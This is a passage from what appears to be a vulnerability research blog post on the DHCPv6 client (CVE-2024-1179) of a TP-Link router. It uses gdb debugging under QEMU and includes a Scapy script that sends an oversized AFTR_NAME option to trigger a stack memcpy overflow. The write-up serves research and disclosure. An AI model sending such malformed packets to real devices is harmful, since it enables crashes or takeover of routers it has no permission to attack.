</span></span></code></pre></div><h5 id=analysis-and-debuging>Analysis and debuging<a href=#analysis-and-debuging class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h5><p>OK cool, now we have a working environment to start our debugging. We will use <code>gdbserver</code> to start the binary and connect to it from our host.</p><p>In the qemu VM we start <code>gdbserver</code> with the following command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/dhcp6c -dDf -c test.conf 
</span></span><span style=display:flex><span> eth0
</span></span></code></pre></div><p>From our host using the qemu VM IP address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>root@dilag:# gdb-multiarch
</span></span><span style=display:flex><span>GNU gdb <span style=color:#f92672>(</span>Ubuntu 14.0.50.20230907-0ubuntu1<span style=color:#f92672>)</span> 14.0.50.20230907-git
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>2023</span> Free Software Foundation, Inc.
</span></span><span style=display:flex><span>License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span></span><span style=display:flex><span>This is free software: you are free to change and redistribute it.
</span></span><span style=display:flex><span>There is NO WARRANTY, to the extent permitted by law.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;show copying&#34;</span> and <span style=color:#e6db74>&#34;show warranty&#34;</span> <span style=color:#66d9ef>for</span> details.
</span></span><span style=display:flex><span>This GDB was configured as <span style=color:#e6db74>&#34;x86_64-linux-gnu&#34;</span>.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;show configuration&#34;</span> <span style=color:#66d9ef>for</span> configuration details.
</span></span><span style=display:flex><span>For bug reporting instructions, please see:
</span></span><span style=display:flex><span>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
</span></span><span style=display:flex><span>Find the GDB manual and other documentation resources online at:
</span></span><span style=display:flex><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For help, type <span style=color:#e6db74>&#34;help&#34;</span>.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;apropos word&#34;</span> to search <span style=color:#66d9ef>for</span> commands related to <span style=color:#e6db74>&#34;word&#34;</span>.
</span></span><span style=display:flex><span>Loading GEF...
</span></span><span style=display:flex><span>GEF is ready, type <span style=color:#e6db74>&#39;gef&#39;</span> to start, <span style=color:#e6db74>&#39;gef config&#39;</span> to configure
</span></span><span style=display:flex><span><span style=color:#ae81ff>304</span> commands loaded <span style=color:#66d9ef>for</span> GDB 14.0.50.20230907-git using Python engine 3.11
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Not found /root/.gef.rc, GEF uses default settings
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef&gt; set architecture mips
</span></span><span style=display:flex><span>The target architecture is set to <span style=color:#e6db74>&#34;mips&#34;</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef&gt; target remote 10.212.141.194:1234
</span></span></code></pre></div><p>We can now start our debugging. We already know from earlier analysis that the packet sent by the DHCPv6 server will be used to construct the pointer <code>p</code> which contains the raw data of all DHCPv6 options sent. Let&rsquo;s add a breakpoint into the <code>sub_405f08</code> function beginning and inspect the first argument which is the pointer we are looking for.</p><pre tabindex=0><code>gef&gt; b *0x405f08+1
Breakpoint 1 at 0x405f09
gef&gt; b *0x405f08+1
Breakpoint 1 at 0x405f09
gef&gt; c
Continuing.

Breakpoint 1, 0x00405f09 in ?? ()
.
.
.
gef&gt; telescope $a0 -n
   $a0  0x7fffe5ec|+0x0000|+000: 0x0e000200
        0x7fffe5f0|+0x0004|+001: 0x01000100
        0x7fffe5f4|+0x0008|+002: 0x00000000
        0x7fffe5f8|+0x000c|+003: 0x482c30da
        0x7fffe5fc|+0x0010|+004: 0x0100a859
        0x7fffe600|+0x0014|+005: 0x03000a00
        0x7fffe604|+0x0018|+006: 0x11000100
        0x7fffe608|+0x001c|+007: 0x55443322
</code></pre><p>For some reason we don&rsquo;t know at this time, we need to add <code>+1</code> to the address we get from Ghidra to get the correct disassembly instructions or correct pointer.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179_2024_1179/Pasted%20image%2020241030033130.png><figcaption><h4></h4></figcaption></figure><p>So this is our <code>p</code> pointer beginning. As we know that it is of type <code>dhcp6opt</code> we can deduce <code>type</code> and <code>len</code> for the first DHCPv6 options. We have the value <code>0x0e000200</code>, and the definition is :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> dhcp6opt {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_type;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>uint16_t</span> dh6opt_len;
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* type-dependent data follows */</span>
</span></span><span style=display:flex><span>} <span style=color:#a6e22e>__attribute__</span> ((__packed__));
</span></span></code></pre></div><p>Thus, we have:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>type<span style=color:#f92672>=</span><span style=color:#ae81ff>0x0002</span>  <span style=color:#f92672>==&gt;</span> <span style=color:#75715e>// SERVERID option according to https://datatracker.ietf.org/doc/html/rfc8415#section-24
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>0x000e</span>
</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span>server duid
</span></span></code></pre></div><p>If we analyze the Advertise packet we sent through Wireshark, we can easily understand that the content at the <code>p</code> pointer that gets passed to the function is nothing than the options part of the packet we sent:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034134.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034324.png><figcaption><h4></h4></figcaption></figure><p>This confirms our intuition. The <code>p</code> content is just <strong>the raw data of all the DHCPv6 options part of our packet</strong>, which is under our control. This means that we can indeed control the content of the <code>p</code> pointer that get passed to the <code>dhcp6_get_options</code> function. The options we are interested in is the <code>AFTR_NAME</code> options, that is where our <code>memcpy</code> is. As we saw earlier the <code>memcpy</code> follows the pattern below, where <code>cp</code> is just the beginning of our <code>AFTR_NAME</code> options raw data, which we can indeed control:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>memcpy</span>(optinfo_something,cp,(<span style=color:#66d9ef>uint16_t</span>)(cp<span style=color:#f92672>-&gt;</span>len));
</span></span></code></pre></div><p>Let&rsquo;s add this options to our packet and inspect the <code>memcpy</code> call.
Unfortunately, there is no <code>AFTR_NAME</code> option implemented in Scapy. We will build it ourselves. To have more control over what we are doing, we will simply build this option as raw data using python bytes strings. But, first, we need to understand how DHCPv6 option is constructed. From the RFC, DHCP options follow the format below:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030040030.png><figcaption><h4></h4></figcaption></figure><p>We can indeed confirm this format using the packet captured by Wireshark:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030034134.png><figcaption><h4></h4></figcaption></figure><p><code>0x0002</code> is the server Identifier<code>option</code> code, <code>0x000e</code> is the <code>Length</code> of this options, the following is server <code>DUID</code> which represent here the option data.
Especially for <code>AFTR_NAME</code>, we have the following format and description:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030092506.png><figcaption><h4></h4></figcaption></figure><p>So following the format we saw earlier, we will construct our dhcpv6 <code>AFTR_NAME</code> option. The option code is 64, length is the length of the payload, and then we will append the payload. The payload also follows a format described in the previous capture. The format of this payload needs to conform to the format of after_name described by the RFC. The length of each DNS label string must be specified, and the length will be converted to <code>.</code> started from the second one. The DNS label is normally limited to <code>63</code> octets. For example, in the above example, when the payload is <code>\x04aftr\x07example\x03com\x00</code> , the result after the program parses it is <em>aftr.example.com</em>. Using this format and description, we write the following script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_dhcp6_advertise</span>(p):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style=display:flex><span>    src_mac <span style=color:#f92672>=</span> br0_mac  <span style=color:#75715e># Bridge interface MAC address</span>
</span></span><span style=display:flex><span>    dst_mac <span style=color:#f92672>=</span> p[Ether]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s MAC address from original packet</span>
</span></span><span style=display:flex><span>    ethernet_layer <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span>src_mac, dst<span style=color:#f92672>=</span>dst_mac)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style=display:flex><span>    ipv6_dst <span style=color:#f92672>=</span> p[IPv6]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s IPv6 address from original packet</span>
</span></span><span style=display:flex><span>    ipv6_src <span style=color:#f92672>=</span> br0_link_local_inet6  <span style=color:#75715e># Bridge interface link-local address</span>
</span></span><span style=display:flex><span>    ipv6_layer <span style=color:#f92672>=</span> IPv6(src<span style=color:#f92672>=</span>ipv6_src, dst<span style=color:#f92672>=</span>ipv6_dst)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Port 547: Server port, Port 546: Client port</span>
</span></span><span style=display:flex><span>    udp_layer <span style=color:#f92672>=</span> UDP(sport<span style=color:#f92672>=</span><span style=color:#ae81ff>547</span>, dport<span style=color:#f92672>=</span><span style=color:#ae81ff>546</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style=display:flex><span>    client_duid <span style=color:#f92672>=</span> p[DHCP6OptClientId]<span style=color:#f92672>.</span>duid
</span></span><span style=display:flex><span>    trid <span style=color:#f92672>=</span> p[DHCP6_Solicit]<span style=color:#f92672>.</span>trid
</span></span><span style=display:flex><span>    dhcp6_advertise <span style=color:#f92672>=</span> DHCP6_Advertise(trid<span style=color:#f92672>=</span>trid)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Create DHCPv6 options</span>
</span></span><span style=display:flex><span>    client_id <span style=color:#f92672>=</span> DHCP6OptClientId(duid<span style=color:#f92672>=</span>client_duid)  <span style=color:#75715e># Client Identifier option</span>
</span></span><span style=display:flex><span>    server_id <span style=color:#f92672>=</span> DHCP6OptServerId(duid<span style=color:#f92672>=</span>DUID_LLT(hwtype<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, lladdr<span style=color:#f92672>=</span>src_mac))  <span style=color:#75715e># Server Identifier option</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># AFTR_NAME option</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># &gt;&gt;&gt; hex(63) == &#39;0x3f&#39;</span>
</span></span><span style=display:flex><span>	code <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x40</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># aftr_name: size + string + size + string + ... +</span>
</span></span><span style=display:flex><span>	payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x30</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x30</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>10</span> <span style=color:#75715e># very long AFTR_NAME</span>
</span></span><span style=display:flex><span>	aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Combine all layers and send packet</span>
</span></span><span style=display:flex><span>    pck <span style=color:#f92672>=</span> ethernet_layer <span style=color:#f92672>/</span> ipv6_layer <span style=color:#f92672>/</span> udp_layer <span style=color:#f92672>/</span> dhcp6_advertise <span style=color:#f92672>/</span> server_id <span style=color:#f92672>/</span> client_id <span style=color:#f92672>/</span> aftr_name_option
</span></span><span style=display:flex><span>    sendp(pck, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;br0&#34;</span>, verbose<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span></code></pre></div><p>For the payload, you can see that we create such a big <code>AFTR_NAME</code> (approximately more than 500 bytes). We will now inspect the <code>memcpy</code> call to see what happens, we just need to set a breakpoint before the <code>memcpy</code> and inspect the arguments:</p><pre tabindex=0><code>gef&gt; b *0x004061c6+1
Breakpoint 1 at 0x4061c7
gef&gt; c
</code></pre><p>We can see this on the breakpoint hit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------------------</span> <span style=color:#a6e22e>arguments</span> (guessed) <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x419261</span> <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span> (
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>$</span>a0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf793969a</span>,
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>$</span>a1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7fffe611</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x61616161</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa<span style=color:#960050;background-color:#1e0010>&#39;</span>...,
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>$</span>a2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000030</span>,
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>$</span>a3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>,
</span></span><span style=display:flex><span>   [sp <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000003d4</span>,
</span></span><span style=display:flex><span>   [sp <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p>That is our <code>memcpy</code> call. We can see that the <code>src(a1 register)</code> is indeed our packet payload and the <code>size (a2 register)</code> is the size of each <code>aftr_name</code> part. Now we understand more clearly. The <code>memcpy</code> is copying each part of <code>aftr_name</code> into a buffer which will then be processed to form the final <code>aftr_name</code> (Example: <code>\x04aftr\x07example\x03com\x00</code> will become <code>aftr.example.com</code>). If we look more closely to the destination pointer (<code>a0 register</code>), it is weird at first time but get correct stack address if we advance in one step in the code (after the branching). That is due to something called delay slot branching on MIPS architecture.</p><blockquote><p>[!note]
On the MIPS architecture, jump and branch instructions have a &ldquo;delay slot&rdquo;. This means that the instruction after the jump or branch instruction is executed before the jump or branch is executed.
In addition, there is a group of &ldquo;branch likely&rdquo; conditional branch instructions in which the instruction in the delay slot is executed only if the branch is taken.
The MIPS processors execute the jump or branch instruction and the delay slot instruction as an indivisible unit. If an exception occurs as a result of executing the delay slot instruction, the branch or jump instruction is not executed, and the exception appears to have been caused by the jump or branch instruction. This takes some time to get used to when looking for gadgets. Each time a call/jump is performed, we need to look at the next instruction as well. This can mess up the gadget or actually provide a crucial instruction to make a gadget usable.
<a href="https://www-local.pdc.kth.se/doc/totalview/wwhelp/wwhimpl/common/html/wwhelp.htm?context=Reference&file=MIPSDelaySlotInstructions.html">https://www-local.pdc.kth.se/doc/totalview/wwhelp/wwhimpl/common/html/wwhelp.htm?context=Reference&file=MIPSDelaySlotInstructions.html</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> si
</span></span><span style=display:flex><span>warning: GDB can<span style=color:#960050;background-color:#1e0010>&#39;</span>t find the start of the function at <span style=color:#ae81ff>0x419261</span>.
</span></span><span style=display:flex><span>warning: GDB can<span style=color:#960050;background-color:#1e0010>&#39;</span>t find the start of the function at <span style=color:#ae81ff>0x419261</span>.
</span></span><span style=display:flex><span><span style=color:#ae81ff>0x00419261</span> in <span style=color:#f92672>??</span> ()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[ Legend: Modified <span style=color:#66d9ef>register</span> <span style=color:#f92672>|</span> Code <span style=color:#f92672>|</span> Heap <span style=color:#f92672>|</span> Stack <span style=color:#f92672>|</span> Writable <span style=color:#f92672>|</span> ReadOnly <span style=color:#f92672>|</span> None <span style=color:#f92672>|</span> RWX <span style=color:#f92672>|</span> String ]
</span></span><span style=display:flex><span><span style=color:#f92672>-------------------------------------------------------------------------------------------------------------</span> registers <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>zero<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r0   : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>at<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r1     : <span style=color:#ae81ff>0x1000a400</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>v0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r2     : <span style=color:#ae81ff>0x7fffead0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>v1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r3     : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r4     : <span style=color:#ae81ff>0x7fffead0</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r5     : <span style=color:#ae81ff>0x7fffe611</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x61616161</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa<span style=color:#960050;background-color:#1e0010>&#39;</span>...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r6     : <span style=color:#ae81ff>0x00000030</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>a3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r7     : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r8     : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r9     : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r10    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r11    : <span style=color:#ae81ff>0x656c202c</span> (<span style=color:#960050;background-color:#1e0010>&#39;</span>, le<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t4<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r12    : <span style=color:#ae81ff>0x86cefde4</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t5<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r13    : <span style=color:#ae81ff>0x780052c0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t6<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r14    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t7<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r15    : <span style=color:#ae81ff>0x6e6f6974</span> (<span style=color:#960050;background-color:#1e0010>&#39;</span>tion<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>?</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r16    : <span style=color:#ae81ff>0x7fffe610</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x61616130</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>0</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaa<span style=color:#960050;background-color:#1e0010>&#39;</span>...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r17    : <span style=color:#ae81ff>0x7fffe9e8</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0000000a</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s2<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r18    : <span style=color:#ae81ff>0x00000005</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s3<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r19    : <span style=color:#ae81ff>0x004018b1</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x0064f2f0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s4<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r20    : <span style=color:#ae81ff>0x77ffb000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s5<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r21    : <span style=color:#ae81ff>0x77ffb000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s6<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r22    : <span style=color:#ae81ff>0x77ffe518</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x77f5b000</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x464c457f</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>s7<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r23    : <span style=color:#ae81ff>0x77fffd8c</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000001</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t8<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r24    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>t9<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r25    : <span style=color:#ae81ff>0x77f7d6fc</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x3c1c0008</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>k0<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r26    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>k1<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r27    : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>gp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r28    : <span style=color:#ae81ff>0x780052c0</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>sp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r29    : <span style=color:#ae81ff>0x7fffe110</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000007</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fp<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>s8<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r30: <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>ra<span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>$</span>r31    : <span style=color:#ae81ff>0x004061cd</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x69922493</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>sr         : <span style=color:#ae81ff>0x0000a413</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>lo         : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>hi         : <span style=color:#ae81ff>0x00000003</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>bad        : <span style=color:#ae81ff>0x00430024</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x77ffe390</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>cause      : <span style=color:#ae81ff>0x10800024</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fsr        : <span style=color:#ae81ff>0x00000000</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>fir        : <span style=color:#ae81ff>0x00739300</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>pc         : <span style=color:#ae81ff>0x00419261</span>  <span style=color:#f92672>-&gt;</span>  <span style=color:#ae81ff>0x1a9a60b2</span>
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> 
</span></span><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> print <span style=color:#960050;background-color:#1e0010>$</span>a0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7fffeb94</span>
</span></span><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> xinfo <span style=color:#960050;background-color:#1e0010>$</span>a0
</span></span><span style=display:flex><span><span style=color:#f92672>-------------------------------------</span> xinfo: <span style=color:#ae81ff>0x7fffeb94</span> <span style=color:#f92672>-------------------------------------</span>
